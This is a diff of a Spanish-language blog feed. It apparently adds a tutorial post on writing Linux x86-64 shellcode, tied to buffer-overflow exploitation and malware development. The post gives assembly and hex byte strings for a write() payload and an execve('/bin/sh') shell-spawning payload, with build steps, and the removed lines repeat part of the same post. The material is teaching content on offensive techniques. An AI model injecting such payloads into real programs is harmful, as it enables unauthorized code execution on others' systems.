+&lt;p&gt;Actualemente son usadas ampliamente para ejecutar codigo malicioso, de hecho, si alguna vez explotaste un buffer overflow stack-based, estoy seguro de que las usaste al menos un vez, por otra parte, tambien son muy usadas en el desarrollo de malware, ya que hay muchas tecnicas diferentes para inyectarlas, al fin de cuenta, con las shellcodes puedes ejecutar casi cualquier cosa o cualquier cosa, y esto es gracias a la syscalls&lt;/p&gt;
+
+&lt;h2 id=&quot;syscalls&quot;&gt;Syscalls&lt;/h2&gt;
+
+&lt;p&gt;Las syscalls son metodos establecidos por el sistema operativo para decirle al kernel que realice una tarea, por ejemplo, tenemos este codigo:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ola&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Es muy simple, de hecho, podemos decir que nomas tiene 3 intrucciones, el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; y el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;void main()&lt;/code&gt;. pero la cantidad de syscalls que hace es increible, usaremos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strace&lt;/code&gt; para interceptar y registrar todas las syscalls que hace nuestro binario: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strace ./binario&lt;/code&gt;, y esto arroja:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;execve(&quot;./prueba&quot;, [&quot;./prueba&quot;], 0x7ffc3236ede0 /* 57 vars */) = 0
+brk(NULL)                               = 0x5555f3c59000
+arch_prctl(0x3001 /* ARCH_??? */, 0x7ffe25dc3f10) = -1 EINVAL (Invalid argument)
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=167079, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 167079, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fde591cf000
+close(3)                                = 0
+openat(AT_FDCWD, &quot;/usr/lib/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&amp;gt;\0\1\0\0\0\20:\2\0\0\0\0\0&quot;..., 832) = 832
+pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0755, st_size=1961632, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fde591cd000
+pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
+mmap(NULL, 2006640, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fde58fe3000
+mmap(0x7fde59005000, 1429504, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7fde59005000
+mmap(0x7fde59162000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x17f000) = 0x7fde59162000
+mmap(0x7fde591ba000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d6000) = 0x7fde591ba000
+mmap(0x7fde591c0000, 52848, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fde591c0000
+close(3)                                = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fde58fe1000
+arch_prctl(ARCH_SET_FS, 0x7fde591ce640) = 0
+set_tid_address(0x7fde591ce910)         = 60068
+set_robust_list(0x7fde591ce920, 24)     = 0
+rseq(0x7fde591cef60, 0x20, 0, 0x53053053) = 0
+mprotect(0x7fde591ba000, 16384, PROT_READ) = 0
+mprotect(0x5555f2670000, 4096, PROT_READ) = 0
+mprotect(0x7fde59229000, 8192, PROT_READ) = 0
+prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
+munmap(0x7fde591cf000, 167079)          = 0
+newfstatat(1, &quot;&quot;, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x1), ...}, AT_EMPTY_PATH) = 0
+getrandom(&quot;\x52\x39\x5a\x38\x9f\x83\x1b\x9e&quot;, 8, GRND_NONBLOCK) = 8
+brk(NULL)                               = 0x5555f3c59000
+brk(0x5555f3c7a000)                     = 0x5555f3c7a000
+write(1, &quot;ola\n&quot;, 4ola
+)                    = 4
+exit_group(4)                           = ?
++++ exited with 4 +++
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Todas estas syscalls es lo que hace nuestro simple binario por detras, y nosotros no vemos este funcionamiento, solo vemos que imprime la cadena ola.&lt;/p&gt;
+
+&lt;p&gt;A lo que quiero llegar es que muchas de las instrucciones que hacemos en los lenguajes de programacion, tienen una syscall asociada, ya sea C, Python, Rust, Golang, etc, y es importante conocer las syscalls, por que cuando se desarrollan shellcodes, se llaman directamente a las sycalls tomando en cuenta su estructura.&lt;/p&gt;
+
+&lt;p&gt;Para llamar a syscalls desde lenguaje ensamblador se toman en cuenta las calling conventions, asi que para llamar a uns syscall se hace de esta forma &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall(rdi,rsi,rdx,r10,r8,r9)&lt;/code&gt;, recuerda que los primeros 6 argumentos se pasan por los registos rdi,rsi,rdx,r10,r8,r9, y lo demas se pasa por el stack&lt;/p&gt;
+
+&lt;h2 id=&quot;shellcode-usando-write&quot;&gt;Shellcode usando write()&lt;/h2&gt;
+
+&lt;p&gt;Esta syscall es usada para imprimir algo por la salida estandar (stdout), tiene la estructura:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;int fd: Es el descriptor de archivos donde se va a escribir, se puede establecer como 1(stdout), 2(sdterr), o cualquier otro descriptor que se abrio&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;void *buf: Es un puntero al buffer desde donde se empezaran a leer los datos&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;size_t count: Es el numero de bytes que se van a escribir&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ahora toca programiar en ensamblador:&lt;/p&gt;
+
+&lt;p&gt;Primeramente vamos a definir el inicio de nuestro programa, y lo hare de esta manera:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;section .text
+        global _start:
+
+_start:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;section .text&lt;/code&gt; le estoy diciendo que las instrucciones que le siguen, o apartir de ese punto, se van a almacenar en la seccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.text&lt;/code&gt;, y eso es asi, por que esa seccion contiene las instrucciones que se van a ejecutar.&lt;/p&gt;
+
+&lt;p&gt;Con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;global _start&lt;/code&gt; le estoy diciendo que exporte los simbolos a partir de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_start&lt;/code&gt;, para que sean visiable desde fuera del archivo, y se hace con el fin de que puedan ser leidos por el enlazador (ld).&lt;/p&gt;
+
+&lt;p&gt;Y dentro de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_start&lt;/code&gt; va todo nuestro codigo, y el programa completo se veria asi:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;section .text
+        global _start:
+
+_start:
+        mov rax, 1
+        mov rsi, 0x616e757a614e
+        push rsi
+        mov rsi, rsp
+        mov rdx, 6
+        syscall  
+        mov rax, 60
+        syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rax, 1&lt;/code&gt; estamos copiando el numero 1, al registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt;, es 1, por que la syscall write esta asociada a ese numero en GNU/Linux&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rsi, 0x616e757a614e&lt;/code&gt; le estamos diciendo que copie el valor que queremos mostrar (0x616e757a614e), al registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, y en este caso, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; va a funcionar como puntero al valor que se va a escribir&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rsi&lt;/code&gt; Esta poniendo el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; en el stack, con el fin de que la syscall pueda acceder a lo que queremos imprimir&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rsi, rsp&lt;/code&gt; Aqui le indicamos que copie la direccion del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; al registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, y ahora si, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; apunta al valor que vamos a imprimir el cual esta en el stack&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rdx, 6&lt;/code&gt; Le estamos indicando el tamaño en bytes de lo que se va a mostrar, asi que copia el tamaño de 6 bytes al registro rdx&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; se hace el llamado a write&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Las ultima dos instrucciones se hace el llamado a la syscall exit para que todo termine correctamente&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Ojo&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Te podras dar cuenta que no se usa el registro rdi, que para write, es usado para el descriptor de archivos, y diras: “Como es posible eso, si en la estructura de write se debe de establecer el registro rdi en 1, de hecho y &lt;a href=&quot;https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit&quot;&gt;aca&lt;/a&gt; lo dice”. Y pues no necesariamente, por que el descriptor de archivos ya tiene establecido por defecto el valor 1 para stdout.&lt;/p&gt;
+
+&lt;p&gt;Ahora procedemos a compilar: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nasm -f elf64 shellcode.asm&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Esto nos dejara un archivo .o el cual debemos de enlazar: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld -m elf_x86_64 -s -o write shellcode.o&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Estos dos comandos nos dejo un binario elf, el cual si ejecutamos, se ejecutara la syscall write, y mostrara el texto:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y a toda madre, funciona, pero eso no es una shellcode, es un binario elf, y si lo vemos en un editor hexadecimal podemos ver la shellcode en hexadecimal&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Asi que para pasarla a un byte array, que seria la forma en la que se inyectan, primero usaremos&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objcopy -j .text -O binary shellcode.o write.bin&lt;/code&gt; para generar un archivo .bin&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hexdump -v -e '&quot;\\&quot; 1/1 &quot;x%02x&quot;' write.bin; echo&lt;/code&gt; para imprimir el byte array&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Y ahora si, esto si es una shellcode a como estamos acostumbrados a verlas:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\xb8\x01\x00\x00\x00\x48\xbe\x4e\x61\x7a\x75\x6e\x61\x00\x00\x56\x48\x89\xe6\xba\x06\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\x0f\x05
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;shellcode-para-conseguir-una-shell&quot;&gt;Shellcode para conseguir una shell&lt;/h2&gt;
+
+&lt;p&gt;Ahora usaremos execve para poder ejecutar /bin/sh, y que consigamos una shell, el codigo es el siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;section .text
+    global _start
+
+_start:
+
+    xor rdx, rdx
+    push rdx
+    mov rax, 0x68732f2f6e69622f
+    push rax
+    mov rdi, rsp
+    push rdx
+    push rdi
+    mov rsi, rsp
+    xor rax, rax
+    mov al, 0x3b
+    syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Explicare directamente lo que esta dentro de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_start&lt;/code&gt; por que lo demas ya saben que hace&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor rdx, rdx&lt;/code&gt; El registo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdx&lt;/code&gt; haciendo una operacion XORing consigo mismo, esto es para que el registro este limpio antes de usarlo, es buena practica nomas, si se le quita no pasa nada&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rdx&lt;/code&gt; Metemos un null bye al stack para indicar el final de la cadena que se le pasara como argumento a execve&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rax, 0x68732f2f6e69622f&lt;/code&gt; Copiamos /bin/sh al registro rax (la cadena esta en hex)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rax&lt;/code&gt; Metemos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt; al stack para que pueda ser accedida por el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rdi, rsp&lt;/code&gt; Copiamos la direccion de /bin/sh en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt;, la cual sera el primer argumento de execve, en ese momento el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; apunta a la direccion de /bin/sh&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rdx&lt;/code&gt; Metemos otro byte nulo al stack&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rdi&lt;/code&gt; Metemos la direccion de /bin/sh en el stack&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rsi, rsp&lt;/code&gt; Copiamos la direccion del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, esto funcionara como segundo argumento de execve, que representa el entorno del programa que se ejecutara&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor rax, rax&lt;/code&gt; Lo mismo que el primer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov al, 0x3b&lt;/code&gt; Copiamos el valor 0x3b que representa el numero de la syscall, al registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;al&lt;/code&gt; que funciona como un byte inferior de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt;, y por ultimo se ejecuta la syscall&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Si volvemos a hacer todo el tramite de compilar y enlazar, ya tendremos nuestro ejetutable que nos da una shell, si vemos la shellcode en hex, todo esta perfecto:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y si ejecutamos, nos da una shell:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y listo, tenemos otra shellcode:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y como ultimo, estos dos codigos que te explique, no es la unica forma de llamar a write o execve, ya depende del creador y del contexto donde se usa, y supongo que te ha pasado que cuando haces un BoF, una shellcode te sirve y otra no, aun que tengas todo tu exploit bien.&lt;/p&gt;
+
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="MalDev" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/shellcode/waifu.gif" /><media:content medium="image" url="/assets/img/shellcode/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Un Poco de Pentesting Web - SSTI en Jinja2</title><link href="/blog/posts/2023-05-29-UPDPW-ssti/" rel="alternate" type="text/html" title="Un Poco de Pentesting Web - SSTI en Jinja2" /><published>2023-05-29T00:00:00-06:00</published><updated>2023-05-31T19:55:38-06:00</updated><id>/blog/posts/UPDPW-ssti</id><content type="html" xml:base="/blog/posts/2023-05-29-UPDPW-ssti/">&lt;center style=&quot;font-size: 14px&quot; class=&quot;lead&quot;&gt;(soy ese)&lt;/center&gt;
 
 &lt;h2 id=&quot;flask-y-jinja&quot;&gt;Flask y Jinja&lt;/h2&gt;
 
@@ -227,249 +622,7 @@
 
 &lt;p&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection&quot;&gt;https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="SSTI" /><summary type="html">(soy ese)</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/UPDWP-ssti/waifu.jpg" /><media:content medium="image" url="/assets/img/UPDWP-ssti/waifu.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Shellcodes - syscall write() y execve(bin/sh)</title><link href="/blog/posts/2023-05-29-maldev-shellcodes/" rel="alternate" type="text/html" title="Shellcodes - syscall write() y execve(bin/sh)" /><published>2023-05-29T00:00:00-06:00</published><updated>2023-06-07T19:25:45-06:00</updated><id>/blog/posts/maldev-shellcodes</id><content type="html" xml:base="/blog/posts/2023-05-29-maldev-shellcodes/">&lt;p&gt;Que onda, esta vez te voy a enseñar a como puedes crear shellcodes, te enseñare como crear una usando la syscall write() y otra usando execve() para ejecutar bin/sh&lt;/p&gt;
-
-&lt;h2 id=&quot;shellcodes&quot;&gt;Shellcodes&lt;/h2&gt;
-
-&lt;p&gt;Las shellcodes son un conjunto de instrucciones de bajo nivel (ensamblador) que se inyectan en la memoria de un programa con el fin de ejecutar codigo&lt;/p&gt;
-
-&lt;p&gt;Actualemente son usadas ampliamente para ejecutar codigo malicioso, de hecho, si alguna vez explotaste un buffer overflow stack-based, estoy seguro de que las usaste al menos un vez, por otra parte, tambien son muy usadas en el desarrollo de malware, ya que hay muchas tecnicas diferentes para inyectarlas, al fin de cuenta, con las shellcodes puedes ejecutar casi cualquier cosa o cualquier cosa, y esto es gracias a la syscalls&lt;/p&gt;
-
-&lt;h2 id=&quot;syscalls&quot;&gt;Syscalls&lt;/h2&gt;
-
-&lt;p&gt;Las syscalls son metodos establecidos por el sistema operativo para decirle al kernel que realice una tarea, por ejemplo, tenemos este codigo:&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
-&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ola&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Es muy simple, de hecho, podemos decir que nomas tiene 3 intrucciones, el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; y el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;void main()&lt;/code&gt;. pero la cantidad de syscalls que hace es increible, usaremos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strace&lt;/code&gt; para interceptar y registrar todas las syscalls que hace nuestro binario: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strace ./binario&lt;/code&gt;, y esto arroja:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;execve(&quot;./prueba&quot;, [&quot;./prueba&quot;], 0x7ffc3236ede0 /* 57 vars */) = 0
-brk(NULL)                               = 0x5555f3c59000
-arch_prctl(0x3001 /* ARCH_??? */, 0x7ffe25dc3f10) = -1 EINVAL (Invalid argument)
-access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
-openat(AT_FDCWD, &quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
-newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=167079, ...}, AT_EMPTY_PATH) = 0
-mmap(NULL, 167079, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fde591cf000
-close(3)                                = 0
-openat(AT_FDCWD, &quot;/usr/lib/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
-read(3, &quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&amp;gt;\0\1\0\0\0\20:\2\0\0\0\0\0&quot;..., 832) = 832
-pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
-newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0755, st_size=1961632, ...}, AT_EMPTY_PATH) = 0
-mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fde591cd000
-pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
-mmap(NULL, 2006640, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fde58fe3000
-mmap(0x7fde59005000, 1429504, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7fde59005000
-mmap(0x7fde59162000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x17f000) = 0x7fde59162000
-mmap(0x7fde591ba000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d6000) = 0x7fde591ba000
